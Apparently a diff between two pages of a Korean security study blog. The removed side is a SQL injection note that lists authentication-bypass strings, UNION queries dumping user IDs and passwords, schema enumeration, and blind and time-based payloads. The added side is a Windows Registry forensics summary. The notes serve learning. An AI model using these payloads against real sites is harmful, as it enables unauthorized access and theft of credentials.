@@ -12,7 +12,7 @@
 
 
 
-<title>SQL Injection | Sn0wD3er</title>
+<title>Registry | Sn0wD3er</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">SQL Injection</h1>
+            <h1 class="post-title">Registry</h1>
             
                 <div class="post-meta">
                     
@@ -182,14 +182,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 15, 2020&nbsp;&nbsp;19:49:08</a>
+                        Date: <a href="#">November 17, 2020&nbsp;&nbsp;11:27:07</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="/categories/Web/">Web</a>
+                                <a href="/categories/Forensics/">Forensics</a>
                             
                         </span>
                     
@@ -198,56 +198,37 @@
         </header>
 
         <div class="post-content">
-            <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="인증-우회"><a href="#인증-우회" class="headerlink" title="인증 우회"></a>인증 우회</h3><ul>
-<li><p>인증 쿼리 질의문<br><code>Select * from members where id=&#39;&#39; and pass=&#39;&#39;</code></p>
-</li>
-<li><p><code>&#39; or 1=1 #</code></p>
-</li>
-<li><p><code>&#39; or &#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot; or &quot;x&quot;=&quot;x</code></p>
-</li>
-<li><p><code>&#39;) or (&#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot;) or (&quot;x&quot;=&quot;x</code></p>
-</li>
+            <h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><p>프로세스 유형, 주기억장치 용량, 주변장치 정보, 시스템 매개변수등을 기억하는 공간</p>
+<h3 id="HKEY-CLASS-ROOT"><a href="#HKEY-CLASS-ROOT" class="headerlink" title="HKEY_CLASS_ROOT"></a>HKEY_CLASS_ROOT</h3><ul>
+<li>파일의 확장자에 대한 정보와 파일과 연결에 대한 정보</li>
 </ul>
-<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><ul>
-<li><code>0&#39; union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#</code></li>
-<li><code>0&#39; union select all 1,2,3,4,5 #</code> </li>
-<li><code>&#39; union select all 1,2,3,4,5,6,7,8,9,10,11#</code></li>
-<li><code>&#39; union select all 1,2,database(),4,5,6,7#</code></li>
-<li><code>&#39; union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#</code></li>
-<li><code>&#39; union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name=&#39;users&#39;#</code></li>
-<li><code>&#39; order by 10#</code> : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다</li>
+<h3 id="HKEY-LOCAL-MACHINE"><a href="#HKEY-LOCAL-MACHINE" class="headerlink" title="HKEY_LOCAL_MACHINE"></a>HKEY_LOCAL_MACHINE</h3><ul>
+<li>설치된 하드웨어와 소프트웨어 설치드라이버 설정에 대한 정보가 들어있다</li>
 </ul>
-<p>UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. </p>
-<h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><ul>
-<li><code>&#39; or 1=1 and length(database())=5#</code></li>
-<li><code>&#39; or 1=1= and substring(database(),1,1)=&#39;b&#39;#</code></li>
-<li><code>&#39; or 1=1 and ascii(substring(database(),1,1))=98#</code></li>
+<h3 id="HKEY-CURRENT-USER"><a href="#HKEY-CURRENT-USER" class="headerlink" title="HKEY_CURRENT_USER"></a>HKEY_CURRENT_USER</h3><ul>
+<li>컴퓨터 환경설정에 대한 정보가 들어있다, 현재 로그인된 사용자</li>
 </ul>
-<p>‘참’과 ‘거짓’의 결과만으로 결과를 얻어낸다.</p>
-<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><ul>
-<li><code>&#39; or 1=1 and sleep(5)#</code></li>
+<h3 id="HKEY-USERS"><a href="#HKEY-USERS" class="headerlink" title="HKEY_USERS"></a>HKEY_USERS</h3><ul>
+<li>다수의 사용자 정보가 들어있다</li>
 </ul>
-<p>sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.</p>
-<h2 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h2><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
-<h2 id="My-SQL-Injection에-기본적으로-알아야-할-것들"><a href="#My-SQL-Injection에-기본적으로-알아야-할-것들" class="headerlink" title="My SQL Injection에 기본적으로 알아야 할 것들"></a>My SQL Injection에 기본적으로 알아야 할 것들</h2><ul>
-<li>@@version</li>
-<li>information_schema.tables<ul>
-<li>table_name</li>
+<h3 id="HKEY-CURRENT-CONFIG"><a href="#HKEY-CURRENT-CONFIG" class="headerlink" title="HKEY_CURRENT_CONFIG"></a>HKEY_CURRENT_CONFIG</h3><ul>
+<li>디스플레이와 프린터에 대한 정보가 있다</li>
 </ul>
-</li>
-<li>information_shcema.columns<ul>
-<li>column_name</li>
+<h2 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h2><p>Registry를 구성하기 위한 정보이다.</p>
+<h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><ul>
+<li>로컬 계정 정보와 그룹 정보를 가지고있다.</li>
 </ul>
-</li>
-<li>database()</li>
-<li>length()</li>
-<li>substring(문자열,시작,개수)</li>
-<li>ascii()</li>
-<li>limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용</li>
+<h3 id="SOFTWARE"><a href="#SOFTWARE" class="headerlink" title="SOFTWARE"></a>SOFTWARE</h3><ul>
+<li>시스템 부팅에 필요 없는 시스템 전역 구성 정보</li>
+</ul>
+<h3 id="SYSTEM"><a href="#SYSTEM" class="headerlink" title="SYSTEM"></a>SYSTEM</h3><ul>
+<li>시스템 부팅에 필요한 시스템 전역 구성 정보</li>
+</ul>
+<h3 id="SECURITY"><a href="#SECURITY" class="headerlink" title="SECURITY"></a>SECURITY</h3><ul>
+<li>보안 정책, 권한 할당 정보</li>
+</ul>
+<h3 id="NTUSER-DAT"><a href="#NTUSER-DAT" class="headerlink" title="NTUSER.DAT"></a>NTUSER.DAT</h3><ul>
+<li>사용자 계정 정보</li>
 </ul>
 
         </div>
@@ -263,7 +244,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/">https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/</a></span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/17/forensics/windows/2020-11-17-registry/">https://sn0wd3er.github.io/2020/11/17/forensics/windows/2020-11-17-registry/</a></span>
                     </p>
                 
                 
@@ -287,7 +268,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/SQL-Injection/"># SQL Injection</a>
+                        <a href="/tags/Windows-Registry/"># Windows Registry</a>
                     
                         
                 </span>
@@ -300,10 +281,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/11/16/network/basic/2020-11-16-osi/">OSI 7 Layer</a>
+                <a class="prev" rel="prev" href="/2020/11/17/etc/2020-11-17-dockerWordpress/">워드프레스 설치(도커)</a>
             
             
-            <a class="next" rel="next" href="/2020/11/15/reversing/windows/windowStructure/2020-11-15-pe/">PE 파일</a>
+            <a class="next" rel="next" href="/2020/11/17/network/basic/2020-11-17-internetModel/">인터넷 모델</a>
             
         </section>
 
